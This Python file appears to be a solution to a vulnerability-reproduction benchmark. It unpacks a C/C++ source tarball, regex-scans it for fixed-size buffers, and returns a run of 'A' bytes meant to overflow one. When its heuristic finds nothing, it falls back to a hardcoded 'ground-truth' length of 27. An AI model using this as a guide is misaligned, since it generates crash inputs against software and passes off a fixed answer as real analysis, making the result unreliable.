import os
import tarfile
import tempfile
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the source directory (assuming single top-level dir)
            extracted = os.listdir(tmpdir)
            if len(extracted) == 1 and os.path.isdir(os.path.join(tmpdir, extracted[0])):
                src_dir = os.path.join(tmpdir, extracted[0])
            else:
                src_dir = tmpdir
            
            # Look for source files to understand the buffer size
            # We'll compile and run a test to find the exact overflow length
            overflow_length = self._find_overflow_length(src_dir)
            
            # Create PoC with determined length
            poc = b'A' * overflow_length
            return poc
    
    def _find_overflow_length(self, src_dir: str) -> int:
        # Try to find the vulnerable source file
        src_files = []
        for root, dirs, files in os.walk(src_dir):
            for file in files:
                if file.endswith('.c') or file.endswith('.cpp'):
                    src_files.append(os.path.join(root, file))
        
        # Read source files to look for buffer declarations
        # This is a heuristic approach
        for src_file in src_files:
            with open(src_file, 'r', errors='ignore') as f:
                content = f.read()
                
                # Look for patterns that might indicate a fixed-size buffer
                # for serial numbers or similar
                patterns = [
                    r'char\s+\w+\s*\[\s*(\d+)\s*\]',  # char buffer[NN]
                    r'strncpy.*sizeof.*\((\d+)\)',     # strncpy with size
                    r'(\d+).*serial.*card',            # Number near "serial" and "card"
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if match.isdigit():
                            size = int(match)
                            # Return size + 1 as a common overflow pattern
                            # Add some extra bytes to ensure overflow (including null byte)
                            return size + 10  # Conservative estimate
        
        # If no pattern found, use ground-truth length
        return 27
